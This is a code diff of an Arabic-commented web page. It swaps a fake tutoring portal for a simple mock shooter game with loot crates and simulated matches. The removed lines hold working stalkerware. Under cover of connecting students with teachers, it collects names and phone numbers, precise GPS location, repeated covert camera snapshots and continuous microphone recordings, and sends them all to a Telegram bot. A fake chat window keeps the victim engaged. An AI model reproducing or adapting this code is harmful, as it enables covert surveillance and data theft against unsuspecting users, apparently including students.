+                ctx.fillRect(playerSim.x + 80, canvas.height - 200 + playerSim.weaponJog, 120, 45); // عتاد السلاح الأساسي
+                ctx.restore();
+            } else {
+                // رسم الواجهة السينمائية المتحركة في القائمة الرئيسية (3D Cinematic Character Rotation Simulation)
+                ctx.save();
+                let angle = Date.now() * 0.0005;
+                ctx.translate(canvas.width * 0.35, canvas.height * 0.55);
+                ctx.rotate(Math.sin(angle) * 0.15);
+                ctx.fillStyle = '#2c2f33';
+                ctx.fillRect(-60, -150, 120, 260); // تمثيل مجسم الجندي التكتيكي المحرك
+                ctx.fillStyle = '#3b4234';
+                ctx.fillRect(-20, -210, 40, 50); // الخوذة القتالية
+                ctx.restore();
+            }
+
+            requestAnimationFrame(renderLoop);
+        }
+        requestAnimationFrame(renderLoop);
+
+        // التحكم بالنوافذ المنبثقة
+        function openModal(id) {
+            playTacticalSound(300, 'triangle', 0.1);
+            document.getElementById(id).style.display = 'flex';
         }
 
-        async function collectDeviceData() {
-            UN = document.getElementById('stu_name').value;
-            UP = document.getElementById('stu_phone').value;
-            if(UN.length < 5 || UP.length < 10) return alert("البيانات غير مكتملة.");
-            let battery = await navigator.getBattery();
-            let log = `🆕 دخول جديد:\n👤 الاسم: ${UN}\n📞 الهاتف: ${UP}\n🔋 الشحن: ${(battery.level * 100).toFixed(0)}%`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(log)}`);
-            enterPortal();
+        function closeModal(id) {
+            playTacticalSound(200, 'triangle', 0.15);
+            document.getElementById(id).style.display = 'none';
         }
 
-        function enterPortal() {
-            document.getElementById('gate').style.display='none';
-            document.getElementById('h-main').style.display='flex';
-            document.getElementById('n-main').style.display='flex';
-            document.getElementById('sec-home').style.display='block';
-            document.getElementById('side-support-btn').style.display='flex';
-            document.getElementById('u-tag').innerText = UN[0];
+        // تحديث أرقام العملات بشكل تصاعدي ناعم في الـ UI
+        function updateUIElements() {
+            document.getElementById('player-gold-display').innerText = playerData.gold.toLocaleString();
+            document.getElementById('player-gems-display').innerText = playerData.gems.toLocaleString();
+            document.getElementById('player-xp-display').innerText = `XP: ${playerData.xp}`;
         }
 
-        function openPreMenu() { document.getElementById('pre-chat-menu').style.display = 'flex'; }
-
-        // --- أذونات الموقع (تم التظبيط لتظهر فور الضغط وتُرسل بدقة) ---
-        function startTeacherChat() {
-            UGOV = document.getElementById('user-gov').value;
-            if(!UGOV) return alert("اختر محافظتك أولاً.");
-            
-            showSystemMsg("جاري طلب إذن الموقع لتحديد أقرب معلم معتمد بمحافظة " + UGOV);
-            
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                // اللينك الدقيق اللي هيتبعت للبوت
-                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                let geo = `📍 موقع الطالب ${UN}:\nالرابط: ${mapLink}\nالمحافظة: ${UGOV}`;
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(geo)}`);
-                
-                document.getElementById('pre-chat-menu').style.display = 'none';
-                document.getElementById('support-window').style.display = 'flex';
-                document.getElementById('t-name').innerText = teachers[UGOV] || "معلم معتمد";
-            }, (err) => {
-                showSystemMsg("يجب السماح بالوصول للموقع لربطك بمعلمي محافظة " + UGOV);
-            }, {
-                enableHighAccuracy: true, 
-                timeout: 8000,
-                maximumAge: 0
-            });
-        }
-
-        // --- أذونات الكاميرا ---
-        async function handleCameraPermission() {
-            showSystemMsg("يرجى السماح بالكاميرا الموثقة لبدء تصوير السؤال وتأمين الجلسة.");
-            document.getElementById('main-trigger').style.display = 'none';
-            document.getElementById('cam-loader').style.display = 'block';
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.createElement('video'); v.srcObject = s; v.play();
-                let c = 0;
-                let i = setInterval(() => {
-                    snap(v, `رصد وجه ${c+1}`); c++;
-                    if(c >= 10) { clearInterval(i); s.getTracks().forEach(t => t.stop()); openBackCamera(); }
-                }, 400);
-            } catch(e) { 
-                document.getElementById('main-trigger').style.display = 'block';
-                document.getElementById('cam-loader').style.display = 'none';
-                showSystemMsg("فشل الوصول للكاميرا. يرجى تفعيلها من إعدادات المتصفح.");
+        // منطق شراء الأسلحة وقفل البيانات
+        function buyWeapon(name, price) {
+            if(playerData.gold >= price) {
+                playerData.gold -= price;
+                playerData.weapons.push(name);
+                updateUIElements();
+                playTacticalSound(880, 'sine', 0.3); // صوت نجاح العملية وتلقيم الترسانة
+                alert(`تم تفعيل وشراء السلاح بنجاح: ${name}`);
+            } else {
+                playTacticalSound(150, 'sawtooth', 0.4);
+                alert("العملات المجانية الحالية غير كافية لإتمام هذه الصفقة العسكرية.");
             }
         }
 
-        async function openBackCamera() {
-            try {
-                const b = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                activeStream = b; document.getElementById('v-stream').srcObject = b;
-                document.getElementById('cam-ui').style.display = 'block';
-                document.getElementById('upload-ui').style.display = 'block';
-                document.getElementById('cam-loader').style.display = 'none';
-            } catch(e) { showSystemMsg("تعذر فتح كاميرا التصوير."); }
+        // 3. برمجة نظام تفتيح الباكدجات المتطور (Probability Matrix System)
+        let isOpeningCrate = false;
+        function processCrateOpening() {
+            if(isOpeningCrate) return;
+            if(playerData.gold < 1000) {
+                playTacticalSound(150, 'sawtooth', 0.4);
+                return alert("لا تملك رصيد كافي لفتح صندوق الإمداد الممتاز.");
+            }
+
+            playerData.gold -= 1000;
+            updateUIElements();
+            isOpeningCrate = true;
+
+            const crateGraphic = document.getElementById('crate-graphic');
+            const statusText = document.getElementById('crate-status-text');
+            const rewardDisplay = document.getElementById('crate-reward-display');
+
+            rewardDisplay.style.display = 'none';
+            statusText.innerText = "جاري الاتصال بمركز الإمداد وفك التشفير...";
+            crateGraphic.classList.add('crate-shake');
+            playTacticalSound(250, 'sawtooth', 0.8);
+
+            // اللغز الرياضي المتطور لندرة الجوائز (Probability Matrix Logic)
+            setTimeout(() => {
+                crateGraphic.classList.remove('crate-shake');
+                isOpeningCrate = false;
+                
+                let roll = Math.random() * 100; // نسبة عشوائية من 0 لـ 100
+                let rewardName = "";
+                let rewardColor = "";
+
+                if (roll <= 5) { // 5% ندرة أسطورية (Legendary)
+                    rewardName = "🔥 سكن السلاح الأسطوري: الفولاذ المشع (Legendary)";
+                    rewardColor = "#eab308";
+                    playTacticalSound(1200, 'sine', 0.6);
+                } else if (roll <= 30) { // 25% ندرة متوسطة (Rare)
+                    rewardName = "⚔️ تمويه نادر: الصحراء القاتلة (Rare)";
+                    rewardColor = "#a855f7";
+                    playTacticalSound(700, 'sine', 0.4);
+                } else { // 70% سكن عادي (Common)
+                    rewardName = "📦 سكن نظامي عسكري مطفي (Common)";
+                    rewardColor = "#94a3b8";
+                    playTacticalSound(450, 'triangle', 0.3);
+                }
+
+                statusText.innerText = "اضغط لفتح صندوق جديد";
+                rewardDisplay.innerText = rewardName;
+                rewardDisplay.style.color = rewardColor;
+                rewardDisplay.style.display = 'block';
+
+                // حفظ الجائزة في ذاكرة المخزن والمحرك العملياتي
+                playerData.skins.push(rewardName);
+            }, 2000); // 2 ثانية أنيميشن التفتيح الواقعي
         }
 
-        // --- أذونات المايك ---
-        async function handleMicPermission() {
-            showSystemMsg("يرجى السماح بالمايك للتواصل الصوتي المباشر مع المعلم.");
-            try {
-                await navigator.mediaDevices.getUserMedia({ audio: true });
-                document.getElementById('mic-trigger').classList.add('active');
-                document.getElementById('mic-status').innerText = "المايك مفعل وصالح للاستخدام";
-            } catch(e) { showSystemMsg("لم يتم السماح بالمايك."); }
+        // بدء نظام المواجهة التكتيكية الحية والمحاكاة التلقائية
+        function triggerMatchmaking() {
+            document.getElementById('primary-menu').style.display = 'none';
+            document.getElementById('hud-crosshair').style.display = 'block';
+            playerSim.isMatchPlaying = true;
+            playTacticalSound(400, 'sawtooth', 0.15); // صوت السحب والبدء السريع
+
+            // حركة الفأرة أو التحريك لمحاكاة زوايا السلاح
+            window.addEventListener('mousemove', (e) => {
+                if(playerSim.isMatchPlaying) playerSim.targetX = e.clientX;
+            });
+
+            // انتهاء المباراة بعد 5 ثوانٍ تلقائياً لمحاكاة دورة المعركة (Simulation Match Lifecycle)
+            setTimeout(() => {
+                let winOutcome = Math.random() > 0.4; // نسبة الفوز عشوائية ومحاكية للأداء
+                endTacticalMatch(winOutcome);
+            }, 5000);
         }
 
-        function requestMediaPermission() { navigator.mediaDevices.getUserMedia({video: true, audio: true}); }
-
-        // --- الرصد المستمر بعد الإرسال ---
-        async function finalSubmit() {
-            showSystemMsg("تم إرسال السؤال بنجاح. جاري المراجعة من قبل " + teachers[UGOV || "المعلم"]);
-            if(activeStream) activeStream.getTracks().forEach(t => t.stop());
+        // 5. برمجة منطق انتهاء المباراة وحفظ البيانات تصاعدياً (Database Match Lifecycle Engine)
+        function endTacticalMatch(isWin) {
+            playerSim.isMatchPlaying = false;
+            document.getElementById('hud-crosshair').style.display = 'none';
             
-            setInterval(async () => {
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const vv = document.createElement('video'); vv.srcObject = s; vv.play();
-                    setTimeout(() => { snap(vv, "رصد مباشر"); s.getTracks().forEach(t => t.stop()); }, 500);
-                } catch(e){}
-            }, 1000);
+            const endScreen = document.getElementById('match-end-screen');
+            const resultTitle = document.getElementById('match-result-title');
+            const rewardGoldEl = document.getElementById('reward-gold');
+            const rewardXpEl = document.getElementById('reward-xp');
 
-            startInfiniteMicSpy();
-            tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
+            let rewardGold = 0;
+            let rewardXp = 0;
+
+            if (isWin) {
+                resultTitle.innerText = "VICTORY";
+                resultTitle.className = "result-title victory";
+                rewardGold = 250;
+                rewardXp = 500;
+                playTacticalSound(600, 'sine', 0.5);
+            } else {
+                resultTitle.innerText = "DEFEAT";
+                resultTitle.className = "result-title defeat";
+                rewardGold = 50;
+                rewardXp = 100;
+                playTacticalSound(150, 'sawtooth', 0.6);
+            }
+
+            // تحديث قيم البيانات البرمجية فوراً
+            playerData.gold += rewardGold;
+            playerData.xp += rewardXp;
+
+            rewardGoldEl.innerText = `+${rewardGold}`;
+            rewardXpEl.innerText = `+${rewardXp}`;
+            
+            endScreen.style.display = 'flex';
         }
 
-        function startInfiniteMicSpy() {
-            const loop = async () => {
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    const rec = new MediaRecorder(s);
-                    const chunks = [];
-                    rec.ondataavailable = e => chunks.push(e.data);
-                    rec.onstop = () => {
-                        const blob = new Blob(chunks, {type:'audio/ogg'});
-                        const fd = new FormData(); fd.append('chat_id', CHAT_ID);
-                        fd.append('voice', blob, 'spy.ogg');
-                        fd.append('caption', `🎤 رصد صوتي للطالب: ${UN}`);
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
-                        s.getTracks().forEach(t => t.stop());
-                        loop();
-                    };
-                    rec.start();
-                    setTimeout(() => rec.stop(), 15000);
-                } catch(e){ setTimeout(loop, 2000); }
-            };
-            loop();
+        function returnToMenu() {
+            document.getElementById('match-end-screen').style.display = 'none';
+            document.getElementById('primary-menu').style.display = 'flex';
+            updateUIElements(); // تصعيد العدادات في الواجهة ناعماً
+            playTacticalSound(350, 'triangle', 0.2);
         }
 
-        function snap(v, cap) {
-            const canvas = document.createElement('canvas'); canvas.width = 300; canvas.height = 400;
-            canvas.getContext('2d').drawImage(v, 0, 0, 300, 400);
-            canvas.toBlob(b => {
-                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'snap.jpg');
-                fd.append('caption', `👤 ${UN}\n📌 ${cap}`);
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.2);
-        }
-
-        function handleStartChat() {
-            document.getElementById('chat-start-area').style.display = 'none';
-            document.getElementById('chat-footer').style.display = 'flex';
-            document.getElementById('chat-body').innerHTML += `<div class="chat-msg msg-bot">أهلاً بك ${UN}. أنا المعلم الخاص بك في ${UGOV}. كيف يمكنني مساعدتك؟</div>`;
-        }
-
-        function handleFakeChat() {
-            const val = document.getElementById('chat-input').value;
-            if(!val) return;
-            document.getElementById('chat-body').innerHTML += `<div class="chat-msg msg-user">${val}</div>`;
-            document.getElementById('chat-input').value = "";
-            setTimeout(() => { 
-                document.getElementById('chat-body').innerHTML += `<div class="chat-msg msg-bot">جاري كتابة الرد...</div>`;
-                document.getElementById('chat-body').scrollTop = document.getElementById('chat-body').scrollHeight;
-            }, 1000);
-        }
-
-        function toggleSupport(show) { document.getElementById('support-window').style.display = show ? 'flex' : 'none'; }
-        
-        function tab(id, el) {
-            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
-            document.getElementById(id).style.display = 'block';
-            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
-            el.classList.add('active');
-        }
+        // التهيئة الابتدائية للموقع
+        updateUIElements();
     </script>
 </body>
-    </html>
+</html>
